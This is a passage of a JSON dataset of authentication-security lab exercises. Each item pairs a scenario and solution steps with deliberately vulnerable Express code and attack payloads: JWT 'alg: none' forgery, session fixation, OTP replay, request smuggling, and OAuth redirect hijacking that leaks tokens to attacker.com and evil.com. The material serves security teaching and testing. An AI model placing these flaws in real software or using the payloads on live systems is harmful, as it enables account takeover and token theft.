        "Verify access to /my-account under the victim's identity."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const fetch = require('node-fetch'); app.get('/oauth/callback', async (req, res) => { const { code } = req.query; const tokenResponse = await fetch(`http://oauth-provider/token?code=${code}`); const { access_token } = await tokenResponse.json(); const userInfo = jwt.decode(access_token); res.cookie('session', access_token); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const user = jwt.decode(token); res.send(`Welcome ${user.email}`); }); app.listen(3000);",
      "payloads": [
        "JWT with {\"sub\":\"carlos\",\"email\":\"carlos@example.com\"} signed by attacker",
        "OAuth callback with attacker-signed token"
      ]
    },
    {
      "Lab scenario": "MFA bypass via predictable OTP replay",
      "Lab Description": "The application uses TOTP-based 2FA codes during login, but fails to invalidate or rate-limit them after submission. An attacker who intercepts or guesses a recent OTP can reuse it. To solve: Replay a valid OTP for Carlos to bypass MFA.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login to your own account and intercept the OTP request with Burp Proxy.",
        "Capture the OTP and observe its time-based nature. Identify if replay is possible.",
        "Send a valid login request with Carlos's credentials, then submit your previously captured OTP immediately after.",
        "If rate-limiting is missing, your OTP will be accepted even if not generated for Carlos.",
        "Access the account page to confirm success."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const users = { carlos: 'secretpass' }; let validOtps = {}; app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { validOtps[username] = '654321'; res.status(200).send('Enter OTP'); } else { res.status(401).send('Invalid'); } }); app.post('/verify-otp', (req, res) => { const { username, otp } = req.body; if (otp === validOtps[username]) res.send('Logged in'); else res.status(403).send('Wrong OTP'); }); app.listen(3000);",
      "payloads": [
        "Replay intercepted OTP 654321",
        "Use static OTP valid for multiple users"
      ]
    },
    {
      "Lab scenario": "GraphQL introspection leaking login structure",
      "Lab Description": "The application exposes an unauthenticated GraphQL endpoint with introspection enabled. This allows discovery of internal mutations and input fields used in login. To solve: Discover and exploit the login mutation to access the admin account.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use GraphQL Voyager or graphql-playground to introspect the /graphql endpoint.",
        "Identify the login mutation and its required parameters (e.g., username, password).",
        "Send a mutation login(username:\"admin\", password:\"adminpass\") via Postman.",
        "Capture the session cookie or token returned on successful login.",
        "Access the /admin panel to complete the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const express = require('express'); const app = express(); const schema = buildSchema(`type Query { _: Boolean } type Mutation { login(username: String!, password: String!): String }`); const root = { login: ({ username, password }) => { if (username === 'admin' && password === 'adminpass') return 'token123'; throw new Error('Invalid credentials'); } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(3000);",
      "payloads": [
        "mutation { login(username:\"admin\", password:\"adminpass\") }",
        "GraphQL introspection query"
      ]
    },
    {
      "Lab scenario": "JWT tampering in REST API authorization",
      "Lab Description": "This lab uses stateless JWTs for user authentication in a RESTful API. The application fails to verify the integrity of JWT signatures properly. The token is signed with the algorithm 'none', and the server does not validate the signature field. To solve: Forge a valid token for the user 'carlos' and access the protected /api/user-info endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to capture your own login request and extract the JWT from the Authorization header.",
        "Validate the token structure in jwt.io and note that it uses alg: none.",
        "Manually craft a new token replacing your username with 'carlos' and set alg: none, then remove the signature part.",
        "Use Postman or curl to send a GET request to /api/user-info with the forged token in the Authorization header.",
        "If the server responds with carlos’s data, the lab is solved."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; const users = { carlos: { role: 'admin' }, alice: { role: 'user' } }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, '', { algorithm: 'none' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); const user = users[payload.username]; if (!user) return res.status(401).send('Unauthorized'); res.json({ user }); }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session IDs",
      "Lab Description": "This lab suffers from a session fixation vulnerability. The application accepts arbitrary session identifiers provided by the user before authentication. It fails to generate a new session token upon successful login. To solve: Pre-set a session cookie for Carlos, trick him into logging in, and reuse the same session to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to visit the site while unauthenticated and intercept the response to inject a controlled Set-Cookie: session=attackersessionid.",
        "Create a CSRF proof-of-concept page that performs a login for Carlos using the known session value.",
        "Trigger Carlos to visit the CSRF page and log in using the pre-set session.",
        "Use the same session ID in your browser to access /my-account and confirm you are logged in as Carlos.",
        "Check for a personalized greeting or sensitive information to verify exploitation success."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'pass123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'guest-session'; sessions[sid] = username; res.send('Logged in'); } else { res.status(403).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "Set-Cookie: session=attackersessionid",
        "<form method='POST' action='http://vulnerable-site/login'><input name='username' value='carlos'><input name='password' value='pass123'></form>",
        "Cookie: session=attackersessionid"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in GraphQL token exchange",
      "Lab Description": "This lab uses a misconfigured OAuth flow embedded in a GraphQL endpoint. The application accepts a third-party-issued OAuth token for internal user actions without validating the token audience (aud claim). To solve: Acquire an access token from a mock OAuth provider and use it to fetch Carlos’s private notes using a GraphQL mutation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to simulate login at the OAuth provider and obtain a valid access token.",
        "Decode the JWT using jwt.io and confirm the 'aud' claim is not verified by the backend.",
        "Send a crafted GraphQL query using the Authorization header with the third-party token.",
        "Submit a query like { getPrivateNotes(user: \"carlos\") } to the /graphql endpoint.",
        "If the private notes are returned, the lab is solved."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { getPrivateNotes(user: String): String }`); const root = { getPrivateNotes: ({ user }, req) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (!decoded || !user) return null; return user === 'carlos' ? 'Sensitive notes for Carlos' : 'No notes'; } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4000);",
      "payloads": [
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwiYXVkIjoiYXBwIn0.signature",
        "{ \"query\": \"{ getPrivateNotes(user: \\\"carlos\\\") }\" }"
      ]
    },
    {
      "Lab scenario": "Session fixation via cookie injection in login flow",
      "Lab Description": "This lab simulates a flawed session management implementation that permits session fixation via pre-login cookie injection. The application fails to regenerate session identifiers upon successful authentication. To solve: Hijack Carlos’s session by crafting a fixed session ID and getting him to use it, then access his My account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Using OWASP ZAP, intercept the GET /login request and observe the Set-Cookie response.",
        "2.Note that the same session cookie is reused after login, indicating no regeneration.",
        "3.Create a malicious link containing a pre-set session ID, such as: http://vulnerable.site/login with Cookie: sessionId=attackersession.",
        "4.Trick Carlos into using this link (assumed simulated click in lab environment).",
        "5.Login to the application with Carlos’s credentials using the same session ID and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionId || Math.random().toString(36).substr(2); res.cookie('sessionId', sessionId); res.sendFile(__dirname + '/login.html'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) { res.send(`Welcome ${username}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
      "payloads": [
        "GET /login HTTP/1.1\\nCookie: sessionId=fixed123",
        "POST /login HTTP/1.1\\nCookie: sessionId=fixed123\\nusername=carlos&password=letmein"
      ]
    },
    {
      "Lab scenario": "JWT signature validation disabled in API login handler",
      "Lab Description": "This lab’s API endpoint incorrectly disables JWT signature verification. The backend trusts unsigned JWTs when the 'alg' is set to 'none'. To solve: Forge an unsigned JWT that grants admin access and retrieve the admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1.With Burp Suite, intercept a successful login and extract the JWT from the Authorization header.",
        "2.Decode the token using jwt.io and observe the 'alg' is 'HS256'.",
        "3.Replace the algorithm to 'none' and remove the signature section.",
        "4.Change the payload 'role' to 'admin'.",
        "5.Use Postman to send an Authorization: Bearer <forged token> to /admin and verify access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); } const user = jwt.verify(token, 'secret'); if (user.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
        "JWT: base64url(header).base64url(payload)."
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leads to token reuse in third-party callback",
      "Lab Description": "This lab uses OAuth 2.0 for login via a third-party provider. It incorrectly trusts the 'state' parameter and does not validate token ownership. To solve: Reuse an access token from your account and access Carlos's dashboard.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp to intercept the OAuth login flow for your account and extract the access_token.",
        "2.Inspect the GET /oauth/callback?access_token=<token>&state=<user> request structure.",
        "3.Modify the request to replace 'state' parameter with carlos while keeping your access_token.",
        "4.Resend the modified callback request.",
        "5.Visit /dashboard while authenticated as Carlos to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const users = { 'access-token-abc': 'wiener', 'access-token-def': 'carlos' }; app.get('/oauth/callback', (req, res) => { const { access_token, state } = req.query; const user = users[access_token]; if (user) { req.session = { user: state }; res.redirect('/dashboard'); } else { res.send('Invalid token'); } }); app.get('/dashboard', (req, res) => { if (req.session && req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Please login'); } }); app.listen(5000);",
      "payloads": [
        "GET /oauth/callback?access_token=access-token-abc&state=carlos",
        "GET /dashboard"
      ]
    },
    {
      "Lab scenario": "Credential stuffing via verbose login API responses",
      "Lab Description": "This lab's login endpoint leaks too much information via verbose error messages, facilitating credential stuffing. The error reveals whether the username or password is incorrect. To solve: Enumerate Carlos’s credentials and log in to his account.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "1.Use Burp Suite Intruder to fuzz the username field using a list of common usernames and observe response messages.",
        "2.Find the username that triggers 'Incorrect password' error – this confirms it exists.",
        "3.Use Burp Intruder’s password attack with a common password list against the valid username.",
        "4.Identify the login response with 302 status or 'Welcome' message.",
        "5.Log in to /my-account using the identified credentials."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Username not found'); if (user.password !== password) return res.status(401).send('Incorrect password'); res.send(`Welcome ${username}`); }); app.get('/my-account', (req, res) => { res.send('Sensitive account details for carlos'); }); app.listen(4000);",
      "payloads": [
        "username=admin&password=wrong",
        "username=carlos&password=123456",
        "username=carlos&password=supersecure"
      ]
    },
  {
    "Lab scenario": "JWT algorithm confusion in REST API login",
    "Lab Description": "The backend accepts a JWT token for authentication, but improperly trusts the algorithm field in the token header. The application fails to enforce signature verification when `alg` is set to `none`. To solve: log in as the user 'carlos' by forging a valid JWT token and access the protected /my-account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to capture a valid JWT from your own login flow in the Authorization header.",
      "2. Decode the JWT at jwt.io or using Burp Decoder to inspect its header and payload.",
      "3. Modify the JWT header to set \"alg\": \"none\" and the payload to { \"username\": \"carlos\" }.",
      "4. Remove the signature portion of the JWT and reassemble it as base64(header).base64(payload).",
      "5. Send a GET /my-account request with the forged token in the Authorization: Bearer header to access Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'carlos': { password: 'secret123' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'supersecretkey', { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Access granted to carlos'); } else { try { const verified = jwt.verify(token, 'supersecretkey'); if (verified.username === 'carlos') return res.send('Access granted to carlos'); } catch (e) { return res.status(403).send('Invalid signature'); } } res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('JWT Lab running at http://localhost:3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\": \"none\"}, {\"username\": \"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via Referer header",
    "Lab Description": "The application uses OAuth with an implicit flow for third-party authentication, where the access token is returned in the URL fragment. A misconfigured redirect leaks this token via the Referer header to a third-party domain. To solve: leak Carlos’s token and use it to access /oauth/me.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to proxy the OAuth login flow and inspect the redirect URI for token handling.",
      "2. Observe that the access_token appears in the URL fragment (e.g., #access_token=abc123) after login.",
      "3. Note that the final redirect goes to a third-party image or iframe endpoint, causing the Referer header to leak the entire original URL with token.",
      "4. Use a crafted phishing page or injected iframe to trigger Carlos's login and capture the Referer header server-side.",
      "5. Replay the stolen token via GET /oauth/me with Authorization: Bearer <token> to access the victim’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthTokens = { 'abc123': 'carlos' }; app.get('/redirect', (req, res) => { const html = `<img src='http://attacker.com/log?ref=${req.headers.referer}' />`; res.send(html); }); app.get('/oauth/me', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (oauthTokens[token] === 'carlos') { return res.send('Carlos OAuth profile'); } res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Implicit Token Leak Lab running on port 3000'));",
    "payloads": [
      "#access_token=abc123",
      "Authorization: Bearer abc123",
      "https://victim-app.com/redirect#access_token=abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-login Set-Cookie in SOAP-based login",
    "Lab Description": "The application uses a SOAP endpoint for login and fails to issue a new session identifier after successful authentication. This allows an attacker to predefine the session token used by the victim. To solve: fix the session token for Carlos, then hijack it after he logs in and access /account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture a POST /soap/login SOAP request and inspect the Set-Cookie behavior.",
      "2. Note that a session token is issued before login and not regenerated afterward.",
      "3. Send Carlos a crafted link containing the session ID as a cookie using a CSRF bait or GET request with embedded JavaScript.",
      "4. After Carlos logs in, reuse the known session ID to make an authenticated GET /account request.",
      "5. Verify access to Carlos's account using the fixed session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(cookieParser()); const sessions = {}; const users = { carlos: { password: 'admin123' } }; app.post('/soap/login', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Malformed request'); const [_, username, password] = match; if (users[username] && users[username].password === password) { const sid = req.cookies['sessionid']; sessions[sid] = username; res.send('<response>Login successful</response>'); } else { res.status(403).send('<response>Invalid credentials</response>'); } }); app.get('/account', (req, res) => { const sid = req.cookies['sessionid']; if (sessions[sid] === 'carlos') { return res.send('Carlos account access'); } res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('SOAP Session Fixation Lab running on port 3000'));",
    "payloads": [
      "Set-Cookie: sessionid=attacker-fixed-id",
      "SOAP POST with sessionid reused after victim login"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in login verification endpoint",
    "Lab Description": "The application uses JWT tokens to manage authentication. It trusts the 'alg' header from the user-provided token and does not enforce a secure algorithm on the server side. This leads to an algorithm confusion flaw. The application accepts tokens signed with 'none'. To solve: forge a JWT token to access the admin panel as user 'admin'.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login response with Burp Suite and decode the JWT token from the Authorization header.",
      "2. Use jwt.io or Postman to analyze the JWT structure and note the algorithm used ('HS256').",
      "3. Modify the header to set 'alg' to 'none' and the payload to {\"username\":\"admin\"}.",
      "4. Remove the signature and re-encode the token.",
      "5. Use Burp Repeater to send a request with the forged token in the Authorization header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secretkey', { algorithm: req.body.alg || 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, 'secretkey', { algorithms: [decoded.header.alg] }); if (verified.username === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in OAuth callback",
    "Lab Description": "The application integrates with a third-party OAuth provider. The redirect URI is partially validated and uses string matching to determine legitimacy. This can be bypassed using open redirect techniques. To solve: complete the OAuth login flow and gain a session as 'admin' by hijacking the redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate OAuth login and intercept the redirect URL using Burp Suite.",
      "2. Notice the vulnerable validation on 'redirect_uri' that checks if it 'startsWith' a trusted domain.",
      "3. Modify the 'redirect_uri' to include an attacker-controlled domain via open redirect chaining (e.g. https://trusted.example.com@evil.com).",
      "4. Host a page on evil.com that reflects OAuth authorization code.",
      "5. Exchange the code manually using Postman to complete the OAuth flow and gain access to /my-account as admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validRedirectPrefix = 'https://trusted.example.com'; app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; if (!redirect_uri.startsWith(validRedirectPrefix)) return res.status(400).send('Invalid redirect'); const token = 'admin-session-token'; res.redirect(`${redirect_uri}?token=${token}`); }); app.listen(4000);",
    "payloads": [
      "https://trusted.example.com@evil.com",
      "https://trusted.example.com%2Fevil.com",
      "https://trusted.example.com.redirect.com"
    ]
  },
  {
    "Lab scenario": "Session fixation in login cookie handling",
    "Lab Description": "The application assigns session identifiers via cookies before authentication. These session IDs are not regenerated after login, allowing session fixation. To solve: fixate a session before login, authenticate with user 'carlos', and hijack the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to initiate a session before logging in and capture the 'sessionId' cookie.",
      "2. Log in as 'carlos' without refreshing the session (note no new cookie is issued).",
      "3. In a separate browser or Repeater, reuse the same sessionId to access /my-account.",
      "4. Verify session hijack by checking if Carlos's data is displayed.",
      "5. Capture the response and verify user context."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { const sessionId = req.cookies.sessionId; sessions[sessionId] = username; return res.send('Logged in'); } res.send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) return res.send(`Welcome ${user}`); res.send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionId=abc123",
      "POST /login with sessionId=abc123",
      "GET /my-account with sessionId=abc123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via request smuggling on login route",
    "Lab Description": "The application uses multi-factor authentication, but it is implemented as a second endpoint after initial login. A request smuggling vulnerability allows bypassing MFA by combining requests. To solve: use a smuggled request to send both login and bypass MFA steps in a single POST.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the login and MFA POSTs using Burp Suite and observe the endpoints (/login and /verify-2fa).",
      "2. Identify request smuggling behavior using Burp Collaborator and inspect transfer-encoding.",
      "3. Craft a smuggled request with both POST bodies using CL.TE format.",
      "4. Chain login credentials and 2FA bypass code into a single payload.",
      "5. Forward the smuggled request to gain access to Carlos’s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'password123', mfa: true }]; app.post('/login', (req, res) => { const user = users.find(u => u.username === req.body.username && u.password === req.body.password); if (!user) return res.send('Invalid'); if (user.mfa) return res.send('2FA required'); res.send('Logged in'); }); app.post('/verify-2fa', (req, res) => { if (req.body.code === '000000') return res.send('2FA success'); res.send('Invalid 2FA'); }); app.listen(4000);",
    "payloads": [
      "POST / HTTP/1.1\\r\\nHost: vulnerable.com\\r\\nContent-Length: 100\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n...CL.TE smuggled body with login and 2FA bypass",
      "username=carlos&password=password123\\r\\nPOST /verify-2fa\\r\\ncode=000000"
    ]
  },
  {
    "Lab scenario": "JWT key confusion using public key as HMAC secret",
    "Lab Description": "The server uses asymmetric keys (RS256) for signing JWTs. However, it incorrectly accepts tokens signed with HS256, interpreting the public key as an HMAC secret. This allows attackers to forge valid tokens. To solve: sign a forged JWT using HS256 and the public key to impersonate 'admin'.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Decode a JWT from the application and observe that it uses RS256 as its algorithm.",
      "2. Obtain the server’s public key (leaked or found in /.well-known/jwks.json or /.well-known/jwt-key).",
      "3. Rebuild the JWT header to use HS256 instead of RS256.",
      "4. Use jwt.io or Postman to sign the new token using the public key as the HMAC secret.",
      "5. Submit the forged token to /admin and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); app.get('/token', (req, res) => { const token = jwt.sign({ username: 'guest' }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (payload.username === 'admin') return res.send('Admin Access Granted'); } catch (e) {} res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "JWT signed using HS256 with public.pem content as secret, payload: {\"username\":\"admin\"}",
      "Authorization: Bearer [forged-token]"
    ]
  },
    {
      "Lab scenario": "Session fixation via predictable session ID in login flow",
      "Lab Description": "This application's session management is flawed. After login, it reuses the same session token provided prior to authentication. The application does not invalidate or regenerate the session ID upon successful login. To solve: Fixate a session for the victim and log in using their credentials, then access their My account page using the fixed session.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the application with Burp Suite and note the session cookie set before authentication.",
        "Send a pre-login request to /login and observe the Set-Cookie header.",
        "Craft a malicious link containing the fixed session ID and deliver it to the victim (simulate via cookie injection).",
        "Log in as the victim from another session using their credentials without changing the session ID.",
        "Access the account page using the fixed session ID to confirm takeover."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'adminpass' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid || Math.random().toString(36).slice(2); sessions[sid] = username; res.cookie('sid', sid); res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "GET /login?username=carlos&password=adminpass with Cookie: sid=fixatedvalue",
        "GET /my-account with Cookie: sid=fixatedvalue"
      ]
    },
    {
      "Lab scenario": "JWT tampering via algorithm confusion",
      "Lab Description": "The application uses JWTs for session management, but it does not enforce a strict algorithm validation. It accepts unsigned JWTs when the alg field is set to 'none'. To solve: Modify your JWT to impersonate Carlos by changing the alg header to 'none' and signing out a valid token without a signature.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Log in with your credentials and capture the JWT using Burp Suite.",
        "Decode the JWT header and payload with jwt.io or jwt-tool.",
        "Modify the header to { \"alg\": \"none\", \"typ\": \"JWT\" } and change the payload username to carlos.",
        "Remove the signature part and resend the token using Burp Repeater.",
        "Send a request to /my-account with the tampered JWT in the Authorization header."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; const users = ['wiener', 'carlos']; app.get('/token', (req, res) => { const { username } = req.query; if (users.includes(username)) { const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.send({ token }); } else { res.status(403).send('Nope'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(auth, { complete: true }); if (decoded?.header?.alg === 'none') { res.send(`Welcome ${decoded.payload.user}`); return; } try { const verified = jwt.verify(auth, secret); res.send(`Welcome ${verified.user}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"carlos\" }, Signature: (empty)",
        "Authorization: Bearer <header.payload.>"
      ]
    },
    {
      "Lab scenario": "OAuth redirect manipulation in authorization server",
      "Lab Description": "This app integrates with an external OAuth server but does not validate redirect URIs strictly. This allows redirect URI manipulation to hijack tokens. To solve: Intercept the OAuth login flow, manipulate the redirect_uri to an attacker-controlled domain, and extract Carlos's access token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Initiate OAuth flow using Burp Suite and note the redirect_uri parameter.",
        "Send the request to Burp Repeater and modify redirect_uri to your exploit server URL.",
        "Send the modified OAuth link to the victim (simulate visit).",
        "Capture the access token leaked to your server in the query string.",
        "Replay a request to the resource server using the stolen token to access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123' }; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; if (tokens[user]) { return res.redirect(`${redirect_uri}?access_token=${tokens[user]}`); } res.status(403).send('Invalid user'); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) res.send(`OAuth Welcome ${user}`); else res.status(401).send('Unauthorized'); }); app.listen(4001);",
      "payloads": [
        "/auth?redirect_uri=https://attacker.com/callback&user=carlos",
        "GET /my-account?access_token=abc123"
      ]
    },
    {
      "Lab scenario": "Session hijacking through verbose error message",
      "Lab Description": "This application exposes session IDs in verbose error messages. These leaked session tokens can be used to hijack user sessions. To solve: Trigger an error, retrieve Carlos's session ID from the response, and reuse it to access his account.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
